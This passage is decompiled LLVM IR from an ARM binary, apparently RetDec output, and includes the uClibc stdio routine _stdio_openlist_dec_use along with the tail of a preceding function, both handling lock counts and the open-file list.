  store i1 %v3_18414, i1* %cpsr_c.global-to-local, align 1
  %v9_18414 = icmp eq i32 %v2_18410, %v1_18414.pre
  br i1 %v9_18414, label %dec_label_pc_1841c, label %dec_label_pc_18434

dec_label_pc_18430:                               ; preds = %dec_label_pc_1841c
  %v0_18430 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18430, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18434

dec_label_pc_18434:                               ; preds = %dec_label_pc_18404, %dec_label_pc_1841c.dec_label_pc_18410_crit_edge, %dec_label_pc_18430
  %v0_1843c = phi i32 [ %v0_18430, %dec_label_pc_18430 ], [ %v2_1841025, %dec_label_pc_18404 ], [ %v2_18410, %dec_label_pc_1841c.dec_label_pc_18410_crit_edge ]
  %v1_18434 = phi i32 [ %v0_18430, %dec_label_pc_18430 ], [ %v3_18404, %dec_label_pc_18404 ], [ %v1_18414.pre, %dec_label_pc_1841c.dec_label_pc_18410_crit_edge ]
  %v3_18434 = icmp uge i32 %v0_1843c, %v1_18434
  store i1 %v3_18434, i1* %cpsr_c.global-to-local, align 1
  %v9_18434 = icmp eq i32 %v0_1843c, %v1_18434
  br i1 %v9_18434, label %dec_label_pc_1843c, label %dec_label_pc_18434.dec_label_pc_18404_crit_edge

dec_label_pc_18434.dec_label_pc_18404_crit_edge:  ; preds = %dec_label_pc_18434
  %v0_18404.pre = load i32, i32* @r7, align 4
  %v0_1840c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18404

dec_label_pc_1843c:                               ; preds = %dec_label_pc_18434
  %v2_1843c = icmp ne i32 %v1_18434, 0
  store i1 %v2_1843c, i1* %cpsr_c.global-to-local, align 1
  %v7_18440 = icmp slt i32 %v1_18434, 2
  br i1 %v7_18440, label %dec_label_pc_1845c, label %dec_label_pc_18444

dec_label_pc_18444:                               ; preds = %dec_label_pc_1843c
  %v0_18448 = load i32, i32* %r1.global-to-local, align 4
  %v1_18448 = add i32 %v0_18448, 129
  store i32 %v1_18448, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1845c

dec_label_pc_1845c:                               ; preds = %dec_label_pc_183e8, %dec_label_pc_183cc, %dec_label_pc_18444, %dec_label_pc_1843c
  %v0_1845c = load i32, i32* %r8.global-to-local, align 4
  %v2_18460 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_18460, i32* %r4.global-to-local, align 4
  store i32 %v6_1834c, i32* @r5, align 4
  store i32 %v9_1834c, i32* @r6, align 4
  store i32 %v12_1834c, i32* @r7, align 4
  store i32 %v15_1834c, i32* @r8, align 4
  store i32 %v24_1834c, i32* @lr, align 4
  ret i32 %v0_1845c

; uselistorder directives
  uselistorder i32 %v0_18430, { 1, 0, 2 }
  uselistorder i32 %v1_18414.pre, { 0, 2, 1 }
  uselistorder i32 %v0_183d0, { 1, 0 }
  uselistorder i32 %v0_183d4, { 1, 0 }
  uselistorder i32 %v1_18390.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_1845c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_18434, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1841c, { 1, 0 }
  uselistorder label %dec_label_pc_183cc, { 1, 0 }
  uselistorder label %dec_label_pc_183c0, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_183b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18398, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_18468 = load i32, i32* @r4, align 4
  store i32 %v3_18468, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r5.global-to-local, align 4
  %v4_18478 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 160) to i32*), align 4
  store i32 %v4_18478, i32* %r7.global-to-local, align 4
  %v0_1847c = call i32 @__aeabi_read_tp()
  store i32 %v0_1847c, i32* %r0.global-to-local, align 4
  %v1_18480 = add i32 %v4_18478, 8
  %v2_18480 = inttoptr i32 %v1_18480 to i32*
  %v3_18480 = load i32, i32* %v2_18480, align 4
  store i32 %v3_18480, i32* %r3.global-to-local, align 4
  %v1_18484 = add i32 %v0_1847c, -1168
  store i32 %v1_18484, i32* %r6.global-to-local, align 4
  %v3_18488 = icmp uge i32 %v3_18480, %v1_18484
  store i1 %v3_18488, i1* %cpsr_c.global-to-local, align 1
  %v9_18488 = icmp eq i32 %v3_18480, %v1_18484
  br i1 %v9_18488, label %dec_label_pc_184d4, label %dec_label_pc_18494

dec_label_pc_18494:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_18478, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_184a093 = inttoptr i32 %v4_18478 to i32*
  %v2_184a094 = load i32, i32* %v1_184a093, align 4
  store i32 %v2_184a094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_184a496 = icmp eq i32 %v2_184a094, 0
  br i1 %v9_184a496, label %dec_label_pc_184ac, label %dec_label_pc_184c4

dec_label_pc_184ac:                               ; preds = %dec_label_pc_18494, %dec_label_pc_184ac.dec_label_pc_184a0_crit_edge
  %v0_184ac97 = phi i32 [ %v1_184a4.pre, %dec_label_pc_184ac.dec_label_pc_184a0_crit_edge ], [ 0, %dec_label_pc_18494 ]
  store i32 %v0_184ac97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_184bc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_184bc, label %dec_label_pc_184c0, label %dec_label_pc_184ac.dec_label_pc_184a0_crit_edge

dec_label_pc_184ac.dec_label_pc_184a0_crit_edge:  ; preds = %dec_label_pc_184ac
  %v0_184a0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_184a4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_184a0 = inttoptr i32 %v0_184a0.pre to i32*
  %v2_184a0 = load i32, i32* %v1_184a0, align 4
  store i32 %v2_184a0, i32* %r3.global-to-local, align 4
  %v3_184a4 = icmp uge i32 %v2_184a0, %v1_184a4.pre
  store i1 %v3_184a4, i1* %cpsr_c.global-to-local, align 1
  %v9_184a4 = icmp eq i32 %v2_184a0, %v1_184a4.pre
  br i1 %v9_184a4, label %dec_label_pc_184ac, label %dec_label_pc_184c4

dec_label_pc_184c0:                               ; preds = %dec_label_pc_184ac
  %v0_184c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_184c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_184c4

dec_label_pc_184c4:                               ; preds = %dec_label_pc_18494, %dec_label_pc_184ac.dec_label_pc_184a0_crit_edge, %dec_label_pc_184c0
  %v0_184c4 = phi i32 [ %v0_184c0, %dec_label_pc_184c0 ], [ %v2_184a094, %dec_label_pc_18494 ], [ %v2_184a0, %dec_label_pc_184ac.dec_label_pc_184a0_crit_edge ]
  %v1_184c4 = phi i32 [ %v0_184c0, %dec_label_pc_184c0 ], [ 0, %dec_label_pc_18494 ], [ %v1_184a4.pre, %dec_label_pc_184ac.dec_label_pc_184a0_crit_edge ]
  %v3_184c4 = icmp uge i32 %v0_184c4, %v1_184c4
  store i1 %v3_184c4, i1* %cpsr_c.global-to-local, align 1
  %v9_184c4 = icmp eq i32 %v0_184c4, %v1_184c4
  br i1 %v9_184c4, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_184c4
  %v1_184c8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_184c8, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_184c4, %bb
  %v1_184cc = xor i1 %v9_184c4, true
  call void @__pseudo_cond_branch(i1 %v1_184cc, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_184d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_184d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_184d0 = add i32 %v1_184d0, 8
  %v3_184d0 = inttoptr i32 %v2_184d0 to i32*
  store i32 %v0_184d0, i32* %v3_184d0, align 4
  br label %dec_label_pc_184d4

dec_label_pc_184d4:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_184d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_184d8 = add i32 %v0_184d8, 160
  %v3_184d8 = inttoptr i32 %v2_184d8 to i32*
  %v4_184d8 = load i32, i32* %v3_184d8, align 4
  store i32 %v4_184d8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_184e0 = add i32 %v0_184d8, 12
  %v3_184e0 = inttoptr i32 %v2_184e0 to i32*
  %v4_184e0 = load i32, i32* %v3_184e0, align 4
  store i32 %v4_184e0, i32* %r3.global-to-local, align 4
  %v1_184e4 = inttoptr i32 %v4_184e0 to i32*
  %v2_184e4 = load i32, i32* %v1_184e4, align 4
  store i32 %v2_184e4, i32* %r1.global-to-local, align 4
  %v1_184e8 = add i32 %v4_184d8, 4
  %v2_184e8 = inttoptr i32 %v1_184e8 to i32*
  %v3_184e8 = load i32, i32* %v2_184e8, align 4
  %v2_184ec = icmp ne i32 %v2_184e4, 0
  store i1 %v2_184ec, i1* %cpsr_c.global-to-local, align 1
  %v7_184ec = icmp eq i32 %v2_184e4, 1
  %v1_184f0 = add i32 %v3_184e8, 1
  store i32 %v1_184f0, i32* %r3.global-to-local, align 4
  store i32 %v1_184f0, i32* %v2_184e8, align 4
  br i1 %v7_184ec, label %dec_label_pc_184fc, label %dec_label_pc_18660

dec_label_pc_184fc:                               ; preds = %dec_label_pc_184d4
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_18500 = load i32, i32* %r5.global-to-local, align 4
  %v2_18500 = add i32 %v0_18500, 80
  %v3_18500 = inttoptr i32 %v2_18500 to i32*
  %v4_18500 = load i32, i32* %v3_18500, align 4
  store i32 %v4_18500, i32* %r3.global-to-local, align 4
  %v1_18504 = inttoptr i32 %v4_18500 to i32*
  %v2_18504 = load i32, i32* %v1_18504, align 4
  store i32 %v2_18504, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_18504, 1
  br i1 %tmp46, label %dec_label_pc_18660, label %dec_label_pc_18510

dec_label_pc_18510:                               ; preds = %dec_label_pc_184fc
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_18514 = add i32 %v0_18500, 152
  %v3_18514 = inttoptr i32 %v2_18514 to i32*
  %v4_18514 = load i32, i32* %v3_18514, align 4
  store i32 %v4_18514, i32* %r7.global-to-local, align 4
  %v1_18518 = add i32 %v4_18514, 8
  %v2_18518 = inttoptr i32 %v1_18518 to i32*
  %v3_18518 = load i32, i32* %v2_18518, align 4
  store i32 %v3_18518, i32* %r3.global-to-local, align 4
  %v1_1851c = load i32, i32* %r6.global-to-local, align 4
  %v3_1851c = icmp uge i32 %v3_18518, %v1_1851c
  store i1 %v3_1851c, i1* %cpsr_c.global-to-local, align 1
  %v9_1851c = icmp eq i32 %v3_18518, %v1_1851c
  br i1 %v9_1851c, label %dec_label_pc_18560, label %dec_label_pc_18524

dec_label_pc_18524:                               ; preds = %dec_label_pc_18510
  store i32 %v4_18514, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1852c86 = inttoptr i32 %v4_18514 to i32*
  %v2_1852c87 = load i32, i32* %v1_1852c86, align 4
  store i32 %v2_1852c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1853089 = icmp eq i32 %v2_1852c87, 0
  br i1 %v9_1853089, label %dec_label_pc_18538, label %dec_label_pc_18550

dec_label_pc_18538:                               ; preds = %dec_label_pc_18524, %dec_label_pc_18538.dec_label_pc_1852c_crit_edge
  %v0_1853890 = phi i32 [ %v1_18530.pre, %dec_label_pc_18538.dec_label_pc_1852c_crit_edge ], [ 0, %dec_label_pc_18524 ]
  store i32 %v0_1853890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18548 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18548, label %dec_label_pc_1854c, label %dec_label_pc_18538.dec_label_pc_1852c_crit_edge

dec_label_pc_18538.dec_label_pc_1852c_crit_edge:  ; preds = %dec_label_pc_18538
  %v0_1852c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18530.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1852c = inttoptr i32 %v0_1852c.pre to i32*
  %v2_1852c = load i32, i32* %v1_1852c, align 4
  store i32 %v2_1852c, i32* %r3.global-to-local, align 4
  %v3_18530 = icmp uge i32 %v2_1852c, %v1_18530.pre
  store i1 %v3_18530, i1* %cpsr_c.global-to-local, align 1
  %v9_18530 = icmp eq i32 %v2_1852c, %v1_18530.pre
  br i1 %v9_18530, label %dec_label_pc_18538, label %dec_label_pc_18550

dec_label_pc_1854c:                               ; preds = %dec_label_pc_18538
  %v0_1854c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1854c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18550

dec_label_pc_18550:                               ; preds = %dec_label_pc_18524, %dec_label_pc_18538.dec_label_pc_1852c_crit_edge, %dec_label_pc_1854c
  %v0_18550 = phi i32 [ %v0_1854c, %dec_label_pc_1854c ], [ %v2_1852c87, %dec_label_pc_18524 ], [ %v2_1852c, %dec_label_pc_18538.dec_label_pc_1852c_crit_edge ]
  %v1_18550 = phi i32 [ %v0_1854c, %dec_label_pc_1854c ], [ 0, %dec_label_pc_18524 ], [ %v1_18530.pre, %dec_label_pc_18538.dec_label_pc_1852c_crit_edge ]
  %v3_18550 = icmp uge i32 %v0_18550, %v1_18550
  store i1 %v3_18550, i1* %cpsr_c.global-to-local, align 1
  %v9_18550 = icmp eq i32 %v0_18550, %v1_18550
  br i1 %v9_18550, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_18550
  %v1_18554 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_18554, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_18550, %bb47
  %v1_18558 = xor i1 %v9_18550, true
  call void @__pseudo_cond_branch(i1 %v1_18558, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_1855c = load i32, i32* %r6.global-to-local, align 4
  %v1_1855c = load i32, i32* %r7.global-to-local, align 4
  %v2_1855c = add i32 %v1_1855c, 8
  %v3_1855c = inttoptr i32 %v2_1855c to i32*
  store i32 %v0_1855c, i32* %v3_1855c, align 4
  %v0_18568.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18560

dec_label_pc_18560:                               ; preds = %dec_label_pc_18510, %bb48
  %v0_18568 = phi i32 [ %v0_18500, %dec_label_pc_18510 ], [ %v0_18568.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_18568 = add i32 %v0_18568, 152
  %v3_18568 = inttoptr i32 %v2_18568 to i32*
  %v4_18568 = load i32, i32* %v3_18568, align 4
  store i32 %v4_18568, i32* %r0.global-to-local, align 4
  %v2_1856c = add i32 %v0_18568, 76
  %v3_1856c = inttoptr i32 %v2_1856c to i32*
  %v4_1856c = load i32, i32* %v3_1856c, align 4
  store i32 %v4_1856c, i32* %r2.global-to-local, align 4
  %v1_18570 = add i32 %v4_18568, 4
  %v2_18570 = inttoptr i32 %v1_18570 to i32*
  %v3_18570 = load i32, i32* %v2_18570, align 4
  store i32 %v3_18570, i32* %r3.global-to-local, align 4
  %v1_18574 = inttoptr i32 %v4_1856c to i32*
  %v2_18574 = load i32, i32* %v1_18574, align 4
  store i32 %v2_18574, i32* %r2.global-to-local, align 4
  %v1_18578 = add i32 %v3_18570, 1
  store i32 %v1_18578, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_18578, i32* %v2_18570, align 4
  %v0_185c8.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_185c811 = icmp eq i32 %v0_185c8.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_185c811, label %dec_label_pc_185d4, label %dec_label_pc_1858c

dec_label_pc_1858c:                               ; preds = %dec_label_pc_18560, %dec_label_pc_185c4
  %v0_185b02 = phi i32 [ %v0_185c4, %dec_label_pc_185c4 ], [ %v0_185c8.pr, %dec_label_pc_18560 ]
  %v1_1858c = inttoptr i32 %v0_185b02 to i16*
  %v2_1858c = load i16, i16* %v1_1858c, align 2
  %v3_1858c = zext i16 %v2_1858c to i32
  store i32 %v3_1858c, i32* %r3.global-to-local, align 4
  %v2_18590 = and i32 %v3_1858c, 32816
  store i32 %v2_18590, i32* %r1.global-to-local, align 4
  %v2_18594 = icmp ugt i32 %v2_18590, 47
  store i1 %v2_18594, i1* %cpsr_c.global-to-local, align 1
  %v7_18594 = icmp eq i32 %v2_18590, 48
  %v1_18598 = add i32 %v0_185b02, 32
  %v2_18598 = inttoptr i32 %v1_18598 to i32*
  %v3_18598 = load i32, i32* %v2_18598, align 4
  store i32 %v3_18598, i32* %r4.global-to-local, align 4
  br i1 %v7_18594, label %dec_label_pc_185a4, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1858c
  store i32 %v0_185b02, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_185c4

dec_label_pc_185a4:                               ; preds = %dec_label_pc_1858c
  %v0_185a4 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_185a4 = icmp eq i32 %v0_185a4, 0
  br i1 %v2_185a4, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_185a4
  %v1_185a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_185a8 = load i32, i32* %r7.global-to-local, align 4
  %v3_185a8 = add i32 %v2_185a8, %v1_185a8
  %v4_185a8 = inttoptr i32 %v3_185a8 to i32*
  %v5_185a8 = load i32, i32* %v4_185a8, align 4
  store i32 %v5_185a8, i32* %r3.global-to-local, align 4
  %v3_185ac = inttoptr i32 %v5_185a8 to i32*
  store i32 %v3_18598, i32* %v3_185ac, align 4
  %v0_185b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_185b0 = inttoptr i32 %v0_185b0 to i16*
  %v2_185b0 = load i16, i16* %v1_185b0, align 2
  %v3_185b0 = zext i16 %v2_185b0 to i32
  store i32 %v3_185b0, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_185a4
  %v2_185b08 = load i16, i16* %v1_1858c, align 2
  %v3_185b09 = zext i16 %v2_185b08 to i32
  store i32 %v3_185b09, i32* %r3.global-to-local, align 4
  %v3_185b4 = add i32 %v0_185a4, 32
  %v4_185b4 = inttoptr i32 %v3_185b4 to i32*
  store i32 %v3_18598, i32* %v4_185b4, align 4
  %v0_185b8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_185b8 = phi i32 [ %v3_185b0, %.thread ], [ %v0_185b8.pre, %bb49 ]
  %v1_185b8 = and i32 %v0_185b8, 8192
  %v2_185b8 = icmp eq i32 %v1_185b8, 0
  br i1 %v2_185b8, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_185bc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_185bc, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_185c0 = xor i1 %v2_185b8, true
  call void @__pseudo_cond_branch(i1 %v1_185c0, i32 ptrtoint (i32* @global_var_14eb8.68 to i32))
  %v0_185c4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_185c4

dec_label_pc_185c4:                               ; preds = %.thread38, %bb52
  %v0_185c4 = phi i32 [ %v0_185c4.pre, %bb52 ], [ %v3_18598, %.thread38 ]
  store i32 %v0_185c4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_185c8 = icmp eq i32 %v0_185c4, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_185c8, label %dec_label_pc_185d4, label %dec_label_pc_1858c

dec_label_pc_185d4:                               ; preds = %dec_label_pc_185c4, %dec_label_pc_18560
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_185d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_185d8 = add i32 %v0_185d8, 152
  %v3_185d8 = inttoptr i32 %v2_185d8 to i32*
  %v4_185d8 = load i32, i32* %v3_185d8, align 4
  store i32 %v4_185d8, i32* %r0.global-to-local, align 4
  %v1_185dc = add i32 %v4_185d8, 4
  %v2_185dc = inttoptr i32 %v1_185dc to i32*
  %v3_185dc = load i32, i32* %v2_185dc, align 4
  %v1_185e0 = add i32 %v3_185dc, -1
  store i32 %v1_185e0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_185e4 = icmp eq i32 %v1_185e0, 0
  store i32 %v1_185e0, i32* %v2_185dc, align 4
  br i1 %v2_185e4, label %dec_label_pc_185f0, label %dec_label_pc_18650

dec_label_pc_185f0:                               ; preds = %dec_label_pc_185d4
  %v0_185f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_185f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_185f0 = add i32 %v1_185f0, 8
  %v3_185f0 = inttoptr i32 %v2_185f0 to i32*
  store i32 %v0_185f0, i32* %v3_185f0, align 4
  %v0_185f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_185f4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_185f8

dec_label_pc_185f8:                               ; preds = %dec_label_pc_18628.dec_label_pc_185f8_crit_edge, %dec_label_pc_185f0
  %v0_185f8 = phi i32 [ %v0_185f8.pre, %dec_label_pc_18628.dec_label_pc_185f8_crit_edge ], [ %v0_185f4, %dec_label_pc_185f0 ]
  %v1_185f8 = inttoptr i32 %v0_185f8 to i32*
  %v2_185f8 = load i32, i32* %v1_185f8, align 4
  store i32 %v2_185f8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_185f8, i32* %r2.global-to-local, align 4
  %v2_1860474 = load i32, i32* %v1_185f8, align 4
  store i32 %v2_1860474, i32* %r3.global-to-local, align 4
  %v3_1860876 = icmp uge i32 %v2_1860474, %v2_185f8
  store i1 %v3_1860876, i1* %cpsr_c.global-to-local, align 1
  %v9_1860882 = icmp eq i32 %v2_1860474, %v2_185f8
  br i1 %v9_1860882, label %dec_label_pc_18610, label %dec_label_pc_18628

dec_label_pc_18610:                               ; preds = %dec_label_pc_185f8, %dec_label_pc_18610.dec_label_pc_18604_crit_edge
  %v0_1861083 = phi i32 [ %v1_18608.pre, %dec_label_pc_18610.dec_label_pc_18604_crit_edge ], [ %v2_185f8, %dec_label_pc_185f8 ]
  store i32 %v0_1861083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18620 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18620, label %dec_label_pc_18624, label %dec_label_pc_18610.dec_label_pc_18604_crit_edge

dec_label_pc_18610.dec_label_pc_18604_crit_edge:  ; preds = %dec_label_pc_18610
  %v0_18604.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18608.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18604 = inttoptr i32 %v0_18604.pre to i32*
  %v2_18604 = load i32, i32* %v1_18604, align 4
  store i32 %v2_18604, i32* %r3.global-to-local, align 4
  %v3_18608 = icmp uge i32 %v2_18604, %v1_18608.pre
  store i1 %v3_18608, i1* %cpsr_c.global-to-local, align 1
  %v9_18608 = icmp eq i32 %v2_18604, %v1_18608.pre
  br i1 %v9_18608, label %dec_label_pc_18610, label %dec_label_pc_18628

dec_label_pc_18624:                               ; preds = %dec_label_pc_18610
  %v0_18624 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18624, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18628

dec_label_pc_18628:                               ; preds = %dec_label_pc_185f8, %dec_label_pc_18610.dec_label_pc_18604_crit_edge, %dec_label_pc_18624
  %v0_18630 = phi i32 [ %v0_18624, %dec_label_pc_18624 ], [ %v2_1860474, %dec_label_pc_185f8 ], [ %v2_18604, %dec_label_pc_18610.dec_label_pc_18604_crit_edge ]
  %v1_18628 = phi i32 [ %v0_18624, %dec_label_pc_18624 ], [ %v2_185f8, %dec_label_pc_185f8 ], [ %v1_18608.pre, %dec_label_pc_18610.dec_label_pc_18604_crit_edge ]
  %v3_18628 = icmp uge i32 %v0_18630, %v1_18628
  store i1 %v3_18628, i1* %cpsr_c.global-to-local, align 1
  %v9_18628 = icmp eq i32 %v0_18630, %v1_18628
  br i1 %v9_18628, label %dec_label_pc_18630, label %dec_label_pc_18628.dec_label_pc_185f8_crit_edge

dec_label_pc_18628.dec_label_pc_185f8_crit_edge:  ; preds = %dec_label_pc_18628
  %v0_185f8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_185f8

dec_label_pc_18630:                               ; preds = %dec_label_pc_18628
  %v2_18630 = icmp ne i32 %v1_18628, 0
  store i1 %v2_18630, i1* %cpsr_c.global-to-local, align 1
  %v7_18634 = icmp slt i32 %v1_18628, 2
  br i1 %v7_18634, label %dec_label_pc_18650, label %dec_label_pc_18638

dec_label_pc_18638:                               ; preds = %dec_label_pc_18630
  %v0_18638 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_18638, i32* %r0.global-to-local, align 4
  %v0_1863c = load i32, i32* %r1.global-to-local, align 4
  %v1_1863c = add i32 %v0_1863c, 129
  store i32 %v1_1863c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18650

dec_label_pc_18650:                               ; preds = %dec_label_pc_185d4, %dec_label_pc_18638, %dec_label_pc_18630
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_18654 = load i32, i32* %r5.global-to-local, align 4
  %v2_18654 = add i32 %v0_18654, 80
  %v3_18654 = inttoptr i32 %v2_18654 to i32*
  %v4_18654 = load i32, i32* %v3_18654, align 4
  store i32 %v4_18654, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1865c = inttoptr i32 %v4_18654 to i32*
  store i32 0, i32* %v2_1865c, align 4
  br label %dec_label_pc_18660

dec_label_pc_18660:                               ; preds = %dec_label_pc_184d4, %dec_label_pc_184fc, %dec_label_pc_18650
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_18664 = load i32, i32* %r5.global-to-local, align 4
  %v2_18664 = add i32 %v0_18664, 160
  %v3_18664 = inttoptr i32 %v2_18664 to i32*
  %v4_18664 = load i32, i32* %v3_18664, align 4
  store i32 %v4_18664, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1866c = add i32 %v0_18664, 12
  %v3_1866c = inttoptr i32 %v2_1866c to i32*
  %v4_1866c = load i32, i32* %v3_1866c, align 4
  store i32 %v4_1866c, i32* %r1.global-to-local, align 4
  %v1_18670 = add i32 %v4_18664, 4
  %v2_18670 = inttoptr i32 %v1_18670 to i32*
  %v3_18670 = load i32, i32* %v2_18670, align 4
  store i32 %v3_18670, i32* %r2.global-to-local, align 4
  %v1_18674 = inttoptr i32 %v4_1866c to i32*
  %v2_18674 = load i32, i32* %v1_18674, align 4
  %v1_18678 = add i32 %v3_18670, -1
  store i32 %v1_18678, i32* %r2.global-to-local, align 4
  %v1_1867c = add i32 %v2_18674, -1
  store i32 %v1_1867c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18680 = icmp eq i32 %v1_18678, 0
  store i32 %v1_1867c, i32* %v1_18674, align 4
  %v0_18688 = load i32, i32* %r2.global-to-local, align 4
  %v1_18688 = load i32, i32* %r0.global-to-local, align 4
  %v2_18688 = add i32 %v1_18688, 4
  %v3_18688 = inttoptr i32 %v2_18688 to i32*
  store i32 %v0_18688, i32* %v3_18688, align 4
  br i1 %v2_18680, label %dec_label_pc_18690, label %dec_label_pc_186f0

dec_label_pc_18690:                               ; preds = %dec_label_pc_18660
